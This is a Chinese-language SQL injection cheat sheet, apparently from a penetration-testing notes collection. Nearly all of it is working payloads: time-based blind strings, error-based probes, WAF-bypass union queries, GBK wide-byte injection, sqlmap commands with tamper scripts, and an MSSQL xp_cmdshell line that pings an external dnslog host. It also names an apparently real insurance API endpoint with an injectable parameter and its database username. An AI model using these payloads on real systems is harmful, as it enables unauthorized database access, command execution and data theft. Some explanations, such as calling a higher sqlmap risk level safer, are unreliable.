挖掘技巧
================================

payload
--------------------------------
+ 延迟注入
	- ``id=1' AND IF(1=1,SLEEP(4),0)--+``
	- ``id=1" AND IF(1=1,SLEEP(4),0)--+``
	- ``id=1) AND IF(1=1,SLEEP(4),0)--+``
	- ``id=1') AND IF(1=1,SLEEP(4),0)--+``
	- ``id=1')) AND IF(1=1,SLEEP(4),0)--+``
	- ``id=1") AND IF(1=1,SLEEP(4),0)--+``
	- ``id=")) AND IF(1=1,SLEEP(4),0)--+``
+ 除法可用： ``?id=2/1``
	- 找到可执行的函数或方法
		+ ``?id=4/if(2=2,2,1)`` 即 ``?id=2``
		+ ``?id=4/if(length(user)=1,1,0)`` ：length方法可用
		+ ``?id=4/if(left('123',1)=1,1,0)`` :left方法可用
		+ ``?id=4/if(left(user,1)='a',1,1)`` :证明user可以用
		+ ``?id=1+and+sleep(10)`` :证明sleep函数可用
	- 报错
		+ ``1/(database() like 't%')``
		+ ``1/((current_user)like'r%')``
		+ ``1/((current_user)regexp'^r.*')``
		+ ``1/((current_user)regexp(0x5e726f2e2a))``
		+ ``1/(substr(current_user,1,1)='r')``
		+ ``1/(substr(current_user,1,1)='h')``
		+ ``1/ord(current_user)``
		+ ``1/ord\n(current_user)``
+ 联合注入
	- ``DECLARE @command VARCHAR(8000); SELECT @command=(SELECT TOP 1 name FROM sysobjects); SELECT @command;`` 
	- SQL Server: ``DECLARE @command VARCHAR(8000); SELECT @command='ping xx.dnslog.com'; EXEC Master.dbo.xp_cmdshell @command;select 1 as 'STEP'``
+ 注册邀请码
	- 原理：注册时会在数据库查询邀请码是否存在
	- payload: ``username=test&invitecode=1');(SELECT123FROMPG_SLEEP(10))--&age=10``
+ 其它
	- ``username=john'%2b(select*from(select(sleep(5)))a)%2b'``
	- ``email=\&password=||1#&captcha=Random``
	- ``email=";WAITFORDELAY'0:0:1'--&password=";WAITFORDELAY'0:0:1'--&captcha=Random``

技巧
--------------------------------

带绕过payload
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 判断注入: ``id=1'/*!80000as*/and/*!80000as*/1=1--+`` , ``id=1'/*!80000as*/and/*!80000as*/1=2--+``
+ 判断字段数量： ``id=6'/*80000as*/order/*!80000as*/by/*!80000as*/31--+``
+ 联合查询: ``id=-6'/*!80000as*//*!50000union*//*!80000as*//*!50000select*//*!80000as*/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+``
+ 查询当前数据库名: ``id=-6'/*!80000as*//*!50000union*//*!80000as*//*!50000select*//*!80000as*/1,2,3,4,5,database/*!50000*/(),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31--+``

返回包寻找隐藏注入点
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+ 接口： ``/mps/api/risk_design/queryAllMainRisks`` 可获取所有的保险信息
+ 提取返回包参数
+ 拼接参数channel存在注入： ``/mps/api/risk_design/queryAllMainRisks?channel='%2b(current_user+like+0x6d62736725)%2b'``
+ 注： ``0x6d62736725`` 为用户名 ``mbsg``

宽字节注入
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 示例: ``http://xxx.com/SQL-GBK/index.php?id=1`` 
	::

			%df'被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了%df\’，
			其中\的十六进制是%5C,那么现在%df\'=%df%5c%27,如果程序的默认字符集是GBK等宽字节字符集，
			则MySQL用GBK的编码时,会认为%df%5c是一个宽字符，也就是縗’，也就是说:%df\'=%df%5c%27=縗'，
			因为gbk是多字节编码,他认为两个字节代表一个汉字，所以%df和后面的\也就是%5c变成了一个汉字“運”，
			而’逃逸了出来，有了单引号就好注入了.

			http://xxx.com/SQL-GBK/index.php?id=%df'

			--threads 10	//如果你玩过 msfconsole的话会对这个很熟悉 sqlmap线程最高设置为10
			--level 3 	//sqlmap默认测试所有的GET和POST参数，当--level的值大于等于2的时候也会测试HTTP 
					Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。最高可到5
			--risk 3 	// 执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
			--search 	//后面跟参数 -D -T -C 搜索列（S），表（S）和或数据库名称（S） 如果你脑子够聪明，
					应该知道库列表名中可能会有ctf,flag等字样.

- 执行 ``sqlmap -u "http://xxx.com/SQL-GBK/index.php?id=1%df%27" --search -C flag --level 3 --risk 1 --thread 10`` 
- sqlmap脚本
	--tamper "unmagicquotes.py"

空格绕过
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
- 注释绕过
	``admin"/**/or/**/1=1'``
- sqlmap脚本
	--tamper=space2comment